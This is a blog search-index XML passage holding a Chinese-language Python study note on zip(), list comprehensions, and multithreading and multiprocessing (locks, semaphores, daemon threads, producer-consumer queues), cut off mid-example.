<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Bliss的Python学习笔记</title>
      <link href="/posts/524a945e/"/>
      <url>/posts/524a945e/</url>
      
        <content type="html"><![CDATA[<h1 id="Python学习笔记"><a href="#Python学习笔记" class="headerlink" title="Python学习笔记"></a>Python学习笔记</h1><h2 id="基础部分学习"><a href="#基础部分学习" class="headerlink" title="基础部分学习"></a>基础部分学习</h2><h3 id="zip-函数"><a href="#zip-函数" class="headerlink" title="zip()函数"></a>zip()函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">x = [<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>]</span><br><span class="line">m = <span class="built_in">zip</span>(a,x)        <span class="comment">#zip对象返回的是一个zip类，浅显理解为：可迭代一次性对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(m))      <span class="comment"># &lt;class &#x27;zip&#x27;&gt;</span></span><br><span class="line">i = m.__next__()    <span class="comment">#(&#x27;a&#x27;, &#x27;x&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line">i = m.__next__()    <span class="comment">#(&#x27;b&#x27;, &#x27;y&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line">i = m.__next__()    <span class="comment">#(&#x27;c&#x27;, &#x27;z&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line">i = m.__next__()    <span class="comment"># 打印三次之后，指针遍历完了zip对象的所有内容</span></span><br><span class="line"><span class="built_in">print</span>(i)            <span class="comment"># 访问一个迭代完的迭代器 --&gt;&gt; 报错 StopIteration</span></span><br></pre></td></tr></table></figure><h3 id="列表推导式学习"><a href="#列表推导式学习" class="headerlink" title="列表推导式学习"></a>列表推导式学习</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = [x  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>) <span class="keyword">if</span> x % <span class="number">9</span> == <span class="number">0</span>]</span><br><span class="line">以上代码输出结果为 ：[<span class="number">0</span>, <span class="number">9</span>]</span><br><span class="line">可将推导式变形为</span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> x % <span class="number">9</span> ==<span class="number">0</span>:</span><br><span class="line">        b.append(x)</span><br></pre></td></tr></table></figure><p>优点 ：简化代码量。</p><h2 id="多线程-x2F-进程的学习"><a href="#多线程-x2F-进程的学习" class="headerlink" title="多线程&#x2F;进程的学习"></a>多线程&#x2F;进程的学习</h2><h3 id="多线程-threading库简单学习"><a href="#多线程-threading库简单学习" class="headerlink" title="多线程-threading库简单学习"></a>多线程-threading库简单学习</h3><h4 id="可通过函数定义方法的模式引用多线程"><a href="#可通过函数定义方法的模式引用多线程" class="headerlink" title="可通过函数定义方法的模式引用多线程"></a>可通过函数定义方法的模式引用多线程</h4><p><strong>简单代码块引用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_name</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(name,<span class="string">&quot;start&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="built_in">print</span>(name,i)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(name,<span class="string">&quot;end&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;主线程start&quot;</span>)</span><br><span class="line">    t1 = Thread(target=print_name,args=(<span class="string">&quot;t1&quot;</span>,))</span><br><span class="line">    t2 = Thread(target=print_name,args=(<span class="string">&quot;t2&quot;</span>,))</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;主线程end&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="可通过重写Thread类引用多线程"><a href="#可通过重写Thread类引用多线程" class="headerlink" title="可通过重写Thread类引用多线程"></a>可通过重写Thread类引用多线程</h4><p><strong>简单代码块引用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span>(<span class="title class_ inherited__">Thread</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name</span>):</span><br><span class="line">        Thread.__init__(self)</span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name, <span class="string">&quot;start&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="built_in">print</span>(self.name, i)</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(self.name, <span class="string">&quot;end&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;主线程start&quot;</span>)</span><br><span class="line">    t1 = MyThread(<span class="string">&#x27;t1&#x27;</span>)</span><br><span class="line">    t2 = MyThread(<span class="string">&#x27;t2&#x27;</span>)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;主线程end&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="join方法"><a href="#join方法" class="headerlink" title="join方法"></a>join方法</h4><p>上述引用代码在执行时输出均为以下执行效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">主线程start</span><br><span class="line">t1 start</span><br><span class="line">t1 0</span><br><span class="line">t2 start</span><br><span class="line">t2 0</span><br><span class="line">主线程end</span><br><span class="line">t1 1</span><br><span class="line">t2 1</span><br><span class="line">t1 2</span><br><span class="line">t2 2</span><br><span class="line">t2t1  endend</span><br></pre></td></tr></table></figure><p>如图<img src="/posts/524a945e/202304161352029.png" alt="image-20230416135221696"></p><p>当<code>t1</code>与<code>t2</code>线程调用<code>start()</code>方法后，打印出了<code>主线程end</code>，但是<code>t1 t2</code>并没有执行完，还在继续执行输出。<strong>注意：并不是打印了主线程end 就是主线程结束了，只是主线程没有等<code>t1 t2</code>线程结束，仍然在继续运行主线程</strong></p><p>如果需要 <code>t1 t2</code>执行完成在继续执行主线程，可以调用 <code>join()</code>方法。代码块如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;主线程start&quot;</span>)</span><br><span class="line">    t1 = MyThread(<span class="string">&#x27;t1&#x27;</span>)</span><br><span class="line">    t2 = MyThread(<span class="string">&#x27;t2&#x27;</span>)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;主线程end&quot;</span>)</span><br></pre></td></tr></table></figure><p>增加<code>t1 t2</code>调用<code>join()</code>方法后执行效果如下<img src="/posts/524a945e/202304161403487.png" alt="image-20230416140316313"></p><p>会需要当两个子进程<code>t1 t2</code>结束后，主线程才会继续运行</p><h4 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h4><p>守护进程为 主进程结束后，守护进程也直接结束。使用方法为 <code>线程名.daemon = True</code>设置该线程对象的<code>daemon</code>属性为<code>True</code>如图</p><p><img src="/posts/524a945e/202304161406524.png" alt="image-20230416140655433"></p><p>当主线程打印 <code>主线程end</code>后 守护线程<code>t1</code>也就被结束了。</p><p>这个时候有一个需要明确的<strong>重要的点</strong>，如下代码块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;主线程start&quot;</span>)</span><br><span class="line">    t1 = MyThread(<span class="string">&#x27;t1&#x27;</span>)</span><br><span class="line">    t2 = MyThread(<span class="string">&#x27;t2&#x27;</span>)</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;主线程end&quot;</span>)</span><br></pre></td></tr></table></figure><p>两个子线程，但<code>t1</code>为守护线程，<code>t2</code>并没有守护线程的属性。所以该代码在运行时，执行效果如下<img src="/posts/524a945e/202304161410277.png" alt="image-20230416141043133"></p><p>当主线程打印出 <code>主线程end</code>后，但守护进程<code>t1</code>仍然在继续执行。所以主线程的真正结束时间是: 所有非守护子线程运行结束后，才会结束主线程，同理守护子线程也会结束。因为非守护进程<code>t2</code>没有结束，所以主进程未结束，所以<code>t1</code>进程在主线程打印出<code>主线程end</code>后仍继续执行。</p><h4 id="互斥锁及应用场景学习"><a href="#互斥锁及应用场景学习" class="headerlink" title="互斥锁及应用场景学习"></a>互斥锁及应用场景学习</h4><p>无互斥锁<code>demo</code>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">账户</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,金额,户主</span>):</span><br><span class="line">        self.金额 = 金额</span><br><span class="line">        self.户主 = 户主</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">取钱</span>(<span class="title class_ inherited__">Thread</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,预取金额,账户,取款人</span>):</span><br><span class="line">        Thread.__init__(self)</span><br><span class="line">        self.预取金额 = 预取金额</span><br><span class="line">        self.账户 = 账户</span><br><span class="line">        self.取走金额 = <span class="number">0</span></span><br><span class="line">        self.取款人 = 取款人</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.预取金额 &gt; self.账户.金额: <span class="comment">#判断账户余额是否满足当前取钱的需求，避免金额为0</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        self.账户.金额 -= self.预取金额</span><br><span class="line">        self.取走金额 += self.预取金额</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.账户.户主&#125;</span>的账户余额为：<span class="subst">&#123;self.账户.金额&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.账户.户主&#125;</span>的账户 共被<span class="subst">&#123;self.取款人&#125;</span>取走 <span class="subst">&#123;self.取走金额&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>定义了两个类 账户类中说明了账户金额和账户的户主，取钱类会判断当前取钱的取款人，预取金额，取钱的账户和取款人。直接用下列代码调用该demo时会存在一个问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    老王 = 账户(<span class="number">100</span>,<span class="string">&quot;老王&quot;</span>)</span><br><span class="line">    t1 = 取钱(<span class="number">80</span>,老王,<span class="string">&quot;小明&quot;</span>)</span><br><span class="line">    t2 = 取钱(<span class="number">80</span>,老王,<span class="string">&quot;小李&quot;</span>)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><p><img src="/posts/524a945e/202304161418116.png" alt="image-20230416141853919"></p><p>两个线程同时访问账户的金额资源，账户余额会变成<code>-20</code>.很显然在生产环境是很可能遭遇到该情况，所以就需要引进一个概念，对访问资源加上<code>锁</code>。调用<code>threading</code>模块的<code>Lock()</code>方法，对资源加锁处理</p><p><strong>互斥锁使用方法</strong>为: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">锁 = Lock() <span class="comment">#初始化 Lock()</span></span><br><span class="line">在需要对资源加锁处调用 `锁.acquire()`方法，当资源利用完后调用`锁.release()`对资源释放</span><br></pre></td></tr></table></figure><p>原有demo加上锁后执行效果如下<img src="/posts/524a945e/202304161425015.png" alt="image-20230416142530797"></p><p>当对该资源加锁后，避免了其他线程在使用中被人修改资源属性。</p><h4 id="信号量的学习与场景"><a href="#信号量的学习与场景" class="headerlink" title="信号量的学习与场景"></a>信号量的学习与场景</h4><p>在互斥锁<code>Lock()</code>的学习使用中，可以限制资源只允许被一个线程访问，当该资源应该控制访问线程数量为一个区间时，互斥锁就无法满足需求了。引入新概念<code>信号量 Semaphore()</code>的学习。</p><p><code>demo</code>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>(<span class="params">name</span>): <span class="comment">#定义一个只能容纳2人的房子</span></span><br><span class="line">    x.acquire()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;当前<span class="subst">&#123;name&#125;</span>已经进入home中&quot;</span>)</span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;当前<span class="subst">&#123;name&#125;</span>已走出房间&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(datetime.now().strftime(<span class="string">&quot;%H:%M:%S&quot;</span>))</span><br><span class="line">    x.release()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    x = Semaphore(<span class="number">2</span>)</span><br><span class="line">    t_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t = Thread(target=home,args=(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>号玩家&quot;</span>,))</span><br><span class="line">        t_list.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> t_list:</span><br><span class="line">        t.start()</span><br></pre></td></tr></table></figure><p>运行该<code>demo</code>后输出效果如图<img src="/posts/524a945e/202304171952847.png" alt="image-20230417195228520"></p><p>当该资源被两个线程访问时，其他线程均需等待。限制访问数量由<code>x = Semaphore(2)</code>决定。演示<code>demo</code>设置为2</p><h4 id="生产者消费者queue学习"><a href="#生产者消费者queue学习" class="headerlink" title="生产者消费者queue学习"></a>生产者消费者<code>queue</code>学习</h4><p>引入新的概念如图<img src="/posts/524a945e/202304171959804.png" alt="image-20230417195902754"></p><p>将线程分为生产者、消费者两类。一类生产数据、一类消费数据。引入新的<code>Python</code>库<code>queue</code></p><p>用法如下：</p><ol><li>引入<code>queue</code>模块的<code>Queue</code>类</li><li>初始化该类 <code>q = Queue()</code></li><li>使用 <code>q.put()</code>对资源池进行添加资源的操作</li><li>使用 <code>q.get()</code>从资源池中取出资源</li></ol><p>演示<code>demo</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">生产者</span>():</span><br><span class="line">    name_list = [<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;李四&#x27;</span>, <span class="string">&#x27;王五&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> q.qsize() &lt;<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> name_list:</span><br><span class="line">            q.put(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;只能容纳两个人的大小&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">消费者</span>():</span><br><span class="line">    i = <span class="number">3</span></span><br><span class="line">    <span class="keyword">while</span> i &gt;<span class="number">0</span>:</span><br><span class="line">        name = q.get()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;这是为<span class="subst">&#123;name&#125;</span>提供的食物&#x27;</span>)</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = Thread(target=生产者)</span><br><span class="line">    t2 = Thread(target=消费者)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><p>使用<strong>生产者与消费者的模式</strong>进行线程之间的通信。因为多线程特征为**<code>共享堆、不共享栈</code>**，可以把这句话理解为 共享全局资源、不共享函数内资源。<code>demo</code>中的列表<code>name_list</code>如果采用多线程的方式只属于调用该函数的线程独有，其他子线程无法访问。运行上述<code>demo</code>输出如图<img src="/posts/524a945e/202304172019788.png" alt="image-20230417201915634"></p><p>但是如果不适用<code>queue</code>采用消费者的模式，直接让线程<code>t2</code>访问<code>name_list</code>资源的话如图<img src="/posts/524a945e/202304172021828.png" alt="image-20230417202156715"></p><p>Pycharm直接报错，当然可以将<code>name_list</code>直接设置为全局变量，但如果场景为爬虫，<code>url_list</code>对应全局变量，存储需要爬取或爆破的url，但需要使用多线程爬访问爬取<code>url</code>的<code>html</code>页面，将<code>生产者()</code>函数定义为爬取，将<code>生产者()</code>函数定义为消费者，负责解析爬取回来的数据。这个时候就需要用到<code>queue</code>模式，让其中一个线程可以消费到另一个函数产生的值。</p><h3 id="多进程multiprocessing库的学习"><a href="#多进程multiprocessing库的学习" class="headerlink" title="多进程multiprocessing库的学习"></a>多进程multiprocessing库的学习</h3><h4 id="多线程与多进程的概念区别"><a href="#多线程与多进程的概念区别" class="headerlink" title="多线程与多进程的概念区别"></a>多线程与多进程的概念区别</h4><p>多线程比多进程节省资源，但是部分场景下多进程比多线程效率高。</p><p><strong>多进程的特点</strong>：进程与进程之间既不共享堆、也不共享栈。</p><h4 id="函数定义模式与重写Process类模式调用多进程"><a href="#函数定义模式与重写Process类模式调用多进程" class="headerlink" title="函数定义模式与重写Process类模式调用多进程"></a>函数定义模式与重写Process类模式调用多进程</h4><p><strong>函数定义模式调用多进程</strong><code>demo</code>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_name</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>线程的pid为<span class="subst">&#123;os.getpid()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>线程的父id为<span class="subst">&#123;os.getppid()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p1 = Process(target=print_name,args=(<span class="string">&quot;张三&quot;</span>,))</span><br><span class="line">    p2 = Process(target=print_name,args=(<span class="string">&quot;李四&quot;</span>,))</span><br><span class="line">    p3 = Process(target=print_name,args=(<span class="string">&quot;王五&quot;</span>,))</span><br><span class="line">    p1.start()</span><br><span class="line">    p2.start()</span><br><span class="line">    p3.start()</span><br></pre></td></tr></table></figure><p>基本上看与多线程的使用方法一致，但通过引用<code>os</code>库的<code>getpid()</code>与<code>getppid()</code>的方法输出子进程<code>pid</code>号与父进程<code>pid</code>号可以看出区别，该<code>demo</code>输出如下图</p><p><img src="/posts/524a945e/202304172036447.png" alt="image-20230417203635252"></p><p>三个子进程输出的父进程<code>pid</code>均为<code>18336</code>，但三个子进程的<code>pid</code>均不相同。子进程都是由父进程创建的。同理</p><p><strong>重写Process()模式调用多进程</strong><code>demo</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyProcess</span>(<span class="title class_ inherited__">Process</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name</span>):</span><br><span class="line">        Process.__init__(self)</span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span>线程的pid为<span class="subst">&#123;os.getpid()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span>线程的父id为<span class="subst">&#123;os.getppid()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> [<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>]:</span><br><span class="line">        p = MyProcess(name)</span><br><span class="line">        p.start()</span><br></pre></td></tr></table></figure><p>输出如下<img src="/posts/524a945e/202304172046848.png" alt="image-20230417204649677"></p><p><strong>函数调用</strong>与**重写Process()**的多进程使用方法基本与多线程一致，均为创建进城后需使用<code>start()</code>方法启动进程，均可使用<code>join()</code>方法使主进程等待子进程运行完成后再继续下一步运行。</p><h4 id="区别点：生产者消费者模式"><a href="#区别点：生产者消费者模式" class="headerlink" title="区别点：生产者消费者模式"></a>区别点：生产者消费者模式</h4><p>多进程与多线程在我们初阶小白水平看来，只有一个区别<strong>堆和栈的资源均不共享</strong>。</p><p>之前的<code>queue</code>在此处也无法实现两个子进程之间的通信了，需直接使用<code>multiprocessing</code>库中的<code>Queue</code>类进行多进程之间的通信。</p><p>**错误示范-引用<code>queue</code>模块中的<code>Queue()</code>**尝试多进程之间的通信</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">生产者</span>():</span><br><span class="line">    name_list = [<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;李四&#x27;</span>, <span class="string">&#x27;王五&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> q.qsize() &lt;<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> name_list:</span><br><span class="line">            q.put(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;只能容纳两个人的大小&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">消费者</span>():</span><br><span class="line">    i = <span class="number">3</span></span><br><span class="line">    <span class="keyword">while</span> i &gt;<span class="number">0</span>:</span><br><span class="line">        name = q.get()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;这是为<span class="subst">&#123;name&#125;</span>提供的食物&#x27;</span>)</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = Process(target=生产者)</span><br><span class="line">    t2 = Process(target=消费者)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><p>该错误示范运行时报错截图如下<img src="/posts/524a945e/202304172054052.png" alt="image-20230417205456762"></p><p>正确<code>demo</code>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,Queue</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">生产者</span>(<span class="params">q</span>):</span><br><span class="line">    name_list = [<span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;李四&#x27;</span>, <span class="string">&#x27;王五&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> q.qsize() &lt;<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> name_list:</span><br><span class="line">            q.put(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;只能容纳两个人的大小&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">消费者</span>(<span class="params">q</span>):</span><br><span class="line">    i = <span class="number">3</span></span><br><span class="line">    <span class="keyword">while</span> i &gt;<span class="number">0</span>:</span><br><span class="line">        name = q.get()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;这是为<span 